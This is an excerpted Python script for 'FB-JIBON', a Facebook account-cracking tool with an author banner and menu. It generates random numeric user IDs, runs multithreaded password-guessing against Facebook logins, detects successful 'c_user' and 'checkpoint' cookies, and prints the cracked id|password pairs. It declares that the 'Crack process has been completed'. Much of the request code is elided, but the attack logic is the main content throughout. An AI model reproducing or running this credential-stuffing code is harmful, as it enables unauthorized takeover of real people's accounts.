...
\____/___/_____/\____/_/ |_/   
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} JIBON                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H} Md Jibon Islam          {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+8801865544636         {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/jibon-123{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}2.0.11                  ║
   {H} ║{P}[{H}•{P}] Tools     : {H}ULTRA GREEN             ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} The JIBON Is BACK 
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract FB-JIBON')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-JIBON {P}Terminal ');os.system("xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.JIBON.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    ...
    if mahin in ["1","01"]:
     ...
     mainx()
        ...
        print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/FB.JIBON.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
...
def gf1(): 
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as JIBON_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        ...
        for number in idf:
            ...
            if mthd in ['1','01']:JIBON_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:JIBON_xd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:JIBON_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:JIBON_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:JIBON_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']:JIBON_xd.submit(f1,idf,pwv)
            else:
               JIBON_xd.submit(m5,idf,pwv)
...
def x8():
  ...
  for nmbr in range(limit):
    ...
    nmp = ''.join(random.choice(string.digits) for _ in range(4))
    user.append(nmp)
  with tred(max_workers=30) as JIBON_xd:
    os.system('clear')
    tl = str(len(user))
    ...
    for guru in user:
      ...
      if hc in ['1','01']:JIBON_xd.submit(m1,idf,pwv)
      elif hc in ['2','02']:JIBON_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:JIBON_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:JIBON_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:JIBON_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:JIBON_xd.submit(f1,idf,pwv)
      else:
       JIBON_xd.submit(main,idf,pwv)
...
def x7():
  ...
  with tred(max_workers=30) as JIBON_xd:
    ...
    for guru in user:
      ...
      if hc in ['1','01']:JIBON_xd.submit(m3,idf,pwv)
      elif hc in ['2','02']:JIBON_xd.submit(t1,idf,pwv)
      elif hc in ['3','03']:JIBON_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:JIBON_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:JIBON_xd.submit(f1,idf,pwv)
  ...
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-JIBON.py')
...
def x6():
  ...
  with tred(max_workers=30) as JIBON_xd:
    ...
    for guru in user: 
      ...
      if hc in ['1','01']:JIBON_xd.submit(m33,idf,pwv)
      elif hc in ['2','02']:JIBON_xd.submit(m2,idf,pwv)
      elif hc in ['3','03']:JIBON_xd.submit(m3,idf,pwv)
      elif hc in ['4','04']:JIBON_xd.submit(m4,idf,pwv)
      elif hc in ['5','05']:JIBON_xd.submit(f1,idf,pwv)
      elif hc in ['6','06']:JIBON_xd.submit(f1,idf,pwv)
  ...
  with tred(max_workers=30) as JIBON_xd:
    ...
    for guru in user:
     ...
     # pwv = [idf,guru,idf[:6],idf[:7],guru[1:]] #,'@#@#@#','bangladesh'] #,'@#@#@#','bangladesh','free fire','i love you']
      if 'm1' in mtd:JIBON_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:JIBON_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:JIBON_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:JIBON_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:JIBON_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:JIBON_xd.submit(f1,idf,pwv)
      else:
       JIBON_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python FB-JIBON.py')
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mJIBON","\x1b[1;92mJIBON","\x1b[1;93mJIBON","\x1b[1;94mJIBON","\x1b[1;95mJIBON","\x1b[1;96mJIBON","\x1b[1;97mJIBON","\x1b[1;91mJIBON","\x1b[1;92mJIBON","\x1b[1;93mJIBON","\x1b[1;94mJIBON","\x1b[1;95mJIBON","\x1b[1;96mJIBON"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mJIBON-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}JIBON-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [JIBON-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mJIBON-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
